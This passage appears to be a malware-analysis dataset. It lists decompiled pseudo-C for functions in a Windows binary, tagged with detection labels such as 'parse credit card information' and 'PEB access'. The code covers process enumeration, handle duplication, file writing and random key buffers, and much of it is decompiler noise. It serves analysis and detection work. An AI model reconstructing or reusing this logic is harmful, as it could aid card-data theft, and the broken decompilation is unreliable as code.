        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint *puVar1;\n    uint argv;\n    uint8_t *puVar2;\n    uint *in_FS_OFFSET;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint lpStartupInfo;\n    uint32_t var_30h;\n    uint var_2ch;\n    uchar *var_18h;\n    uint *var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x405150;\n    uStack16 = 0x404cb0;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_18h = &stack0xffffff78;\n    var_4h = 0;\n    (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n    *0x420828 = 0xffffffff;\n    *0x42082c = 0xffffffff;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n    *puVar1 = *0x420824;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__commode)();\n    *puVar1 = *0x420820;\n    *0x420830 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n    fcn.00404e41();\n    if (*0x4207e0 == 0) {\n        (*_sym.imp.MSVCRT.dll___setusermatherr)(0x404e3e);\n    }\n    fcn.00404e2c();\n    sub.MSVCRT.dll__initterm(0x406008, 0x40600c);\n    var_6ch = *0x42081c;\n    (*_sym.imp.MSVCRT.dll___getmainargs)(&var_60h, &var_70h, &var_64h, *0x420818, &var_6ch);\n    sub.MSVCRT.dll__initterm(0x406000, 0x406004);\n    puVar2 = *_sym.imp.MSVCRT.dll__acmdln;\n    if (*puVar2 != 0x22) {\n        do {\n            if (*puVar2 < 0x21) goto code_r0x00404db5;\n            puVar2 = puVar2 + 1;\n        } while( true );\n    }\n    do {\n        puVar2 = puVar2 + 1;\n        if (*puVar2 == 0) break;\n    } while (*puVar2 != 0x22);\n    if (*puVar2 != 0x22) goto code_r0x00404db5;\n    do {\n        puVar2 = puVar2 + 1;\ncode_r0x00404db5:\n    } while ((*puVar2 != 0) && (*puVar2 < 0x21));\n    var_30h = 0;\n    (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&lpStartupInfo);\n    if ((var_30h & 1) == 0) {\n        var_2ch._0_2_ = 10;\n    }\n    argv = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar2, var_2ch);\n    var_68h = main(argv);\n    (*_sym.imp.MSVCRT.dll_exit)(var_68h);\n    sub.MSVCRT.dll__XcptFilter(**var_14h, var_14h);\n    return;\n}\n",
        "token_count": 833
    },
    "00401a00": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401b8d) overlaps instruction at (ram,0x00401b8b)\n// \n// WARNING: Removing unreachable block (ram,0x00401c59)\n// WARNING: Removing unreachable block (ram,0x00401c63)\n// WARNING: Removing unreachable block (ram,0x00401b53)\n// WARNING: Removing unreachable block (ram,0x00401c67)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401a00(char *arg_8h, uint arg_ch)\n\n{\n    char **ppcVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint8_t uVar6;\n    uint32_t uVar5;\n    uint32_t in_ECX;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint32_t unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint32_t unaff_ESI;\n    char *pcVar12;\n    char **unaff_EDI;\n    char *pcVar13;\n    uint16_t in_ES;\n    uchar in_CF;\n    bool bVar14;\n    bool in_SF;\n    bool bVar15;\n    bool bVar16;\n    bool bVar17;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    \n    puVar9 = &stack0xfffffffc;\n    if ((!in_SF) && (in_SF)) {\n        ppcVar1 = unaff_EDI + 1;\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        in_CF = *(unaff_ESI + 4) < *ppcVar1;\n        in_SF = *(unaff_ESI + 4) - *ppcVar1 < '\\0';\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n    }\n    *arg_8h = 'j';\n    if ((!in_CF) && (in_CF)) {\n        func_0x101879a7();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    arg_8h[1] = -0x48;\n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        in_ST0 = in_ST1;\n    }\n    arg_8h[2] = '\\x1f';\n    arg_8h[3] = -0x5e;\n    arg_8h[4] = -0x1d;\n    arg_8h[5] = -8;\n    uVar2 = in_ECX;\n    arg_8h[6] = -0x5f;\n    pcVar12 = arg_8h;\n    if (('\\0' < uVar2) && (uVar2 < '\\x01')) {\n        unaff_ESI = unaff_ESI & 0xffff0000 | in_ES;\n        pcVar12 = arg_8h + -1;\n        pcVar13 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar13 + 1;\n        cVar3 = arg_8h & 0xffff;\n        *pcVar13 = cVar3;\n        arg_8h = arg_8h & 0xffff0000 | cVar3 + (((arg_8h & 0xffff) << 0x10) >> 0x18) * 'y';\n    }\n    pcVar12[7] = -0x65;\n    bVar16 = false;\n    bVar15 = false;\n    bVar14 = (arg_8h & 0x11cb) == 0;\n    pcVar12[8] = -0x46;\n    uVar7 = in_ECX & 0xffff0000;\n    pcVar12[9] = 'j';\n    if ((!bVar14) && (bVar14)) {\n        uVar5 = arg_8h & 0xffffff00 | *0x4bb148d3;\n        *(unaff_ESI + 0xf) = *(unaff_ESI + 0xf) | &stack0xfffffffc;\n        *pcVar12 = *pcVar12 + pcVar12;\n        *(uVar5 - 0x74) = *(uVar5 - 0x74) + (pcVar12 >> 8);\n        uVar4 = pcVar12 * *(uVar5 - 0x78);\n        arg_8h = pcVar12 & 0xffff0000 | uVar4;\n        *unaff_EDI = in_ST0;\n        *arg_8h = *arg_8h + uVar4;\n        pcVar12 = arg_8h + 0x4bb148d3;\n        cVar3 = uVar4 >> 8;\n        bVar16 = SCARRY1(*pcVar12, cVar3);\n        *pcVar12 = *pcVar12 + cVar3;\n        bVar15 = *pcVar12 < '\\0';\n        bVar14 = *pcVar12 == '\\0';\n        pcVar12 = uVar5 + 2;\n        out(*(uVar5 + 1), unaff_ESI);\n    }\n    pcVar12[10] = -0x5b;\n    if ((bVar16 == bVar15) && (bVar16 != bVar15)) {\n        out(0xc4, arg_8h);\n        unaff_ESI = unaff_ESI & 0xffffff00 | unaff_ESI ^ uVar2;\n        *unaff_EDI = arg_8h;\n        bVar14 = unaff_EBX >> 8 == *arg_8h;\n    }\n    pcVar12[0xb] = -0x3c;\n    puVar11 = &stack0xfffffffc;\n    if ((!bVar14) && (puVar11 = &stack0xfffffffc,  bVar14)) {\n        puVar10 = &stack0xfffffff4;\n        puVar11 = &stack0xfffffff4;\n        cVar3 = '\\x10';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar9;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    pcVar12[0xc] = -0x1e;\n    pcVar12[0xd] = 'F';\n    uVar5 = in_ECX | arg_8h << 0x10;\n    while( true ) {\n        uVar7 = (uVar7 >> 8 & 0xffff00) << 8 | uVar5 & 0xffff;\n        pcVar12[0xe] = 'S';\n        pcVar12 = *(puVar11 + 8);\n        pcVar12[0xf] = '3';\n        pcVar12[0x10] = 'k';\n        bVar14 = false;\n        bVar17 = false;\n        bVar16 = false;\n        bVar15 = (uVar5 >> 0x10 & 0x11cb) == 0;\n        pcVar12[0x11] = 'l';\n        if ((bVar15) || (!bVar15)) {\n            pcVar12[0x12] = -0x24;\n        }\n        else {\n            uVar6 = uVar5 >> 0x18;\n            uVar8 = unaff_EBX;\n            bVar14 = CARRY1(uVar8, uVar6);\n            uVar2 = uVar8 + uVar6;\n            bVar17 = SCARRY1(uVar8, uVar6) != SCARRY1(uVar2, '\\0');\n            unaff_EBX = uVar2;\n            bVar16 = uVar2 < '\\0';\n            bVar15 = uVar2 == 0;\n        }\n        if ((bVar15 || bVar17 != bVar16) || (!bVar15 && bVar17 == bVar16)) break;\n        uVar5 = unaff_ESI;\n        if (uVar7 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    pcVar12[0x13] = -0x1a;\n    if ((!bVar14 && !bVar15) && (bVar14 || bVar15)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    pcVar12[0x14] = -0x59;\n    pcVar12[0x15] = -8;\n    pcVar12[0x16] = -0x45;\n    pcVar12[0x17] = -4;\n    **(puVar11 + 0xc) = 0x18;\n    return;\n}\n",
        "token_count": 2026
    },
    "00401eb0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f9c) overlaps instruction at (ram,0x00401f9a)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401eb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    uint32_t in_EAX;\n    uint *puVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    int32_t extraout_ECX;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    bVar11 = (in_EAX & 0x1e59) == 0;\n    if ((bVar11) || (!bVar11)) {\n        puVar4 = fcn.00403490(arg_18h, arg_1ch, \";\\\\ek^\u00c7\", 7);\n        pcVar2 = _sym.imp.MSVCRT.dll_rand;\n        if (puVar4 != NULL) {\n            var_24h = 0;\n            puVar10 = &var_23h;\n            var_4h = puVar4;\n            for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            *puVar10 = 0;\n            *(puVar10 + 2) = 0;\n            uVar8 = 0;\n            do {\n                uVar5 = (*pcVar2)();\n                uVar5 = uVar5 & 0x800000ff;\n                if (uVar5 < 0) {\n                    uVar5 = (uVar5 - 1 | 0xffffff00) + 1;\n                }\n                (&var_24h)[uVar8] = uVar5;\n                uVar9 = uVar8 + 1;\n                bVar11 = uVar8 - 0x1f < 0;\n                uVar8 = uVar9;\n            } while (uVar9 < 0x20);\n            if ((bVar11) || (!bVar11)) {\n                iVar7 = 8;\n            }\n            else {\n                pcVar6 = uVar5 + 0x8b92f + (uVar9 < 0x20);\n                *pcVar6 = *pcVar6 + pcVar6;\n                iVar7 = extraout_ECX;\n            }\n            puVar10 = &var_24h;\n            for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar4 = *puVar10;\n                puVar10 = puVar10 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            fcn.004022e0(arg_8h, arg_ch, arg_10h, arg_14h, 0xd8, 0x20);\n            fcn.00404990(arg_18h, arg_1ch);\n            return 1;\n        }\n        return 0;\n    }\n    uVar1 = 9 < (in_EAX & 0xf) | in_AF;\n    uVar3 = CONCAT11((in_EAX >> 8) + uVar1, in_EAX + uVar1 * '\\x06') & 0xff0f;\n    if (in_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if ((in_EAX & 0xffff0000 | uVar3) != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar3);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 918
    },
    "004044f0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040451e)\n// WARNING: Removing unreachable block (ram,0x00404524)\n// WARNING: Removing unreachable block (ram,0x004045fd)\n\nbool fcn.004044f0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.00403700(0x80000002, 0x42073c, str.9MqU, &var_8h, &var_210h, &var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(&var_210h, 0);\n    if (iVar2 == -1) {\n        return false;\n    }\n    iVar2 = fcn.004043a0(&var_210h, &var_10ch);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(&var_10ch, 0x420794);\n        if (iVar2 == 0) {\n            iVar2 = (*pcVar1)(&var_10ch, 0x420798);\n            return iVar2 != 0;\n        }\n        return true;\n    }\n    return false;\n}\n",
        "token_count": 453
    },
    "004020c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004020ef)\n// WARNING: Removing unreachable block (ram,0x004020f3)\n// WARNING: Removing unreachable block (ram,0x004020f4)\n\nuint __cdecl fcn.004020c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    iVar1 = fcn.00404a80(0x420338);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    bVar4 = iVar3 == 0;\n    if (bVar4) {\n        return 0;\n    }\n    if ((!bVar4) && (bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 308
    },
    "00402170": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004021da) overlaps instruction at (ram,0x004021d9)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00402170(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    ushort uVar6;\n    uchar *puVar7;\n    uint8_t *unaff_EDI;\n    uint8_t in_AF;\n    bool bVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte6 Var9;\n    \n    puVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (puVar4 == 0xffffffff) {\n        return 0;\n    }\n    iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(puVar4, arg_ch, arg_10h, &fcn.00402170::arg_8h, 0);\n    if (iVar5 != 0) {\n        uVar3 = *0x420814;\n        cVar1 = uVar3 - *unaff_EDI;\n        puVar7 = puVar4 + -1;\n        Var9 = func_0x1018814c((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                               (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10\n                               | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar3 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                               (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n        uVar6 = Var9 >> 0x20;\n        bVar8 = Var9 == 0;\n        if (!bVar8) {\n            *(extraout_ECX + 0x420810) = puVar7;\n            *(extraout_ECX + 0x42080c) = 0x4021e9;\n            Var9 = fcn.004020c0(*(extraout_ECX + 0x420810));\n            uVar6 = Var9 >> 0x20;\n            bVar8 = Var9 == 0;\n            *0x420814 = bVar8;\n            bVar8 = !bVar8;\n        }\n        if ((!bVar8) && (bVar8)) {\n            out(*puVar7, uVar6);\n            puVar7 = puVar4;\n        }\n        *(extraout_ECX + 0x420810) = puVar7;\n        *(extraout_ECX + 0x42080c) = 0;\n        *(extraout_ECX + 0x420808) = 0x402216;\n        Var9 = fcn.00403b40(*(extraout_ECX + 0x42080c), *(extraout_ECX + 0x420810));\n        *(extraout_ECX + 0x420812) = Var9 >> 0x20;\n        *(extraout_ECX + 0x42080e) = Var9;\n        if (*0x420814 == 0) {\n            *(extraout_ECX + 0x420810) = puVar7;\n            pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n            *(extraout_ECX + 0x42080c) = 0x40223e;\n            (*pcVar2)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 969
    },
    "004022e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004028f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nunkbyte6 __cdecl fcn.004028f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 75
    },
    "004033b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004033b0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402250(0x4202cc);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00403520": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403538) overlaps instruction at (ram,0x00403533)\n// \n// WARNING: Removing unreachable block (ram,0x004035f7)\n// WARNING: Removing unreachable block (ram,0x0040357a)\n// WARNING: Removing unreachable block (ram,0x00403587)\n// WARNING: Removing unreachable block (ram,0x00403538)\n\nuint fcn.00403520(int32_t param_1)\n\n{\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    uint8_t uVar1;\n    int32_t iVar2;\n    int16_t unaff_BX;\n    uchar *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    uint uStack523;\n    \n    puVar5 = &uStack523;\n    for (iVar2 = 0x7f; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar2 = fcn.004038c0();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar8 = SBORROW4(param_1, -1);\n    bVar7 = param_1 + 1 < 0;\n    bVar6 = param_1 == -1;\n    uVar1 = extraout_CL;\n    if (bVar6) {\n        iVar2 = fcn.00403830();\n        bVar8 = false;\n        bVar7 = iVar2 < 0;\n        bVar6 = iVar2 == 0;\n        uVar1 = extraout_CL_00;\n        if (bVar6) {\n            bVar8 = false;\n            bVar7 = unaff_BX < 0;\n            bVar6 = unaff_BX == 0;\n            param_1 = 0xd;\n        }\n        else {\n            param_1 = 0xc;\n        }\n    }\n    puVar3 = &stack0xfffffffc;\n    if ((!bVar6 && bVar8 == bVar7) && (puVar3 = &stack0xfffffffc,  bVar6 || bVar8 != bVar7)) {\n        *(iVar2 + -0x72c625aa) = *(iVar2 + -0x72c625aa) ^ uVar1;\n        puVar3 = &stack0xfffffffd;\n    }\n    iVar2 = (**0x4207fc)();\n    if (iVar2 != 0) {\n        return 0;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        puVar3 = puVar3 + -1;\n        param_1 = iVar2;\n    }\n    *(puVar5 + 3) = param_1 + 4;\n    (**0x420804)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    iVar2 = (**0x420800)();\n    bVar6 = false;\n    *(puVar3 + 8) = iVar2;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar4 = *(puVar3 + 8);\n    *(puVar3 + -4) = 3000;\n    (**0x4207f8)(uVar4, 2, puVar3 + -4, 4);\n    if ((!bVar6) && (bVar6)) {\n        LOCK();\n        uVar4 = 0x138b2633;\n    }\n    iVar2 = (**0x4207f4)(uVar4, puVar3 + -0x208, 0, 0, 0x84000000, 0);\n    if (iVar2 == 0) {\n        (**0x420808)(uVar4);\n        return 0;\n    }\n    (**0x420808)(iVar2);\n    (**0x420808)(uVar4);\n    return 1;\n}\n",
        "token_count": 922
    },
    "004040e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404228) overlaps instruction at (ram,0x00404227)\n// \n// WARNING: Removing unreachable block (ram,0x00404243)\n// WARNING: Removing unreachable block (ram,0x00404228)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004040e0(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00403ab0();\n    if (iVar1 == 0) {\n        fcn.00404280();\n        return false;\n    }\n    fcn.00402010();\n    iVar1 = fcn.00404a80(str.8VYX);\n    if (iVar1 != -1) {\n        iVar1 = fcn.00404a80(0x420324);\n        if (iVar1 == -1) {\n            fcn.00404280();\n        }\n        return false;\n    }\n    fcn.00402fe0();\n    iVar1 = fcn.004033b0();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00401630(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00404630(&var_20h);\n        if (iVar1 != 0) {\n            iVar1 = *unaff_ESI;\n            *(puVar2 + 3) = unaff_ESI + 1;\n            iVar1 = fcn.00403d50(iVar1 >> 0x1f, &var_60h, &stack0xfffffffc, &var_20h, &var_40h);\n            return iVar1 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 840
    },
    "00404a80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b38) overlaps instruction at (ram,0x00404b35)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404a80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x4207e8)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x4207ec)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x00404b44:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_8h = var_128h;\n            iVar1 = var_4h;\n            goto code_r0x00404b44;\n        }\n        iVar2 = (**0x4207f0)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 477
    },
    "00402940": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e36) overlaps instruction at (ram,0x00402e34)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402c8d)\n\nvoid fcn.00402940(void)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    char extraout_CL;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    char extraout_CH_00;\n    char extraout_CH_01;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    char extraout_DH;\n    uint16_t extraout_DX;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint16_t uVar6;\n    uint8_t *unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint *unaff_EBP;\n    uint *puVar9;\n    uint uVar10;\n    uint16_t unaff_SI;\n    uint uVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    uint uVar14;\n    int16_t in_SS;\n    int16_t iVar15;\n    bool bVar16;\n    bool bVar17;\n    char cVar18;\n    char cVar19;\n    ulong uVar20;\n    ulong uVar21;\n    int32_t iVar22;\n    uchar uVar23;\n    unkbyte3 Var24;\n    uchar uVar25;\n    uint *puVar26;\n    uchar auStack72510 [24074];\n    uchar *puStack48436;\n    uint uStack48390;\n    ushort uVar27;\n    ushort uVar28;\n    uint *apuStack24215 [2];\n    uint *puStack32;\n    \n    puStack32 = 0x402965;\n    fcn.00403cb0(0x4202b0, 0x12, 0x4202e0, 10);\n    bVar16 = (extraout_EDX & 0x1200) == 0;\n    puStack32 = 0x402983;\n    fcn.00403cb0(0x4202b0, 0x12, str.FIoU, 0x12);\n    puVar8 = unaff_EBP;\n    if ((!bVar16) && (bVar16)) {\n        puVar9 = &stack0xffffffe0;\n        puVar8 = &stack0xffffffe0;\n        cVar18 = '\\x10';\n        puVar13 = unaff_EBP;\n        do {\n            puVar13 = puVar13 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar13;\n            cVar18 = cVar18 + -1;\n            puStack32 = unaff_EBP;\n        } while ('\\0' < cVar18);\n    }\n    apuStack24215[1] = 0x4029a5;\n    fcn.00403cb0(0x4202b0, 0x12, 0x420300, 4);\n    puVar9 = puVar8;\n    if ((!bVar16) && (bVar16)) {\n        puVar13 = &stack0xffffa16d;\n        puVar9 = &stack0xffffa16d;\n        cVar18 = '\\x10';\n        puVar26 = puVar8;\n        do {\n            puVar26 = puVar26 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar26;\n            cVar18 = cVar18 + -1;\n            apuStack24215[1] = puVar8;\n        } while ('\\0' < cVar18);\n    }\n    uStack48390 = 0x4029c7;\n    fcn.00403cb0(0x4202b0, 0x12, 0x420304, 0xc);\n    bVar16 = extraout_DH == extraout_CL;\n    uVar27 = 0x29e8;\n    fcn.00403cb0(0x4202b0, 0x12, \";\\\\ek^\u00c7\", 7);\n    if (bVar16) goto code_r0x004029f9;\n    while( true ) {\n        iVar15 = in_SS;\n        if (!bVar16) {\ncode_r0x004029f9:\n            uVar27 = 